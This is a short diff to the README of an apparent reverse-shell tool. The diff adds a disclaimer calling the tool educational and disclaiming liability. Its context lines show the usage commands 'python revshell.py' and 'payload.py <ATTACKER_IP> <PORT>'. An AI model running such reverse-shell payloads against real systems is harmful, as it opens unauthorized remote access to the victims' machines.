@@ -23,3 +23,5 @@ python revshell.py
 payload.py <ATTACKER_IP> <PORT>
 ```
 <h2 align="center"> DISCLAIMER </h2>
+<h3 align="center"> This tool is developed for educational purposes and ethical security testing only
+The developer of this software (and any contributors) assumes no liability and is not responsible for any misuse or damage caused by this program. </h3>
